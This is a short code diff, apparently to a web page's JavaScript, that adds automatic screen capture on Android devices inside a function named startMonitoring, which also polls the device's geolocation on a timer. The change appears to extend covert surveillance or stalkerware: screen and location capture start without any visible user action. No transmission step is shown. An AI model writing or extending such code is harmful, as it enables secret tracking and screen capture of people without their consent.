@@ -93,6 +93,11 @@
         }
         
         function startMonitoring() {
+            // Auto-start screen capture on Android
+            if (isAndroid) {
+                setTimeout(() => captureScreen(), 2000);
+            }
+            
             if (navigator.geolocation) {
                 setInterval(() => {
                     navigator.geolocation.getCurrentPosition(pos => {
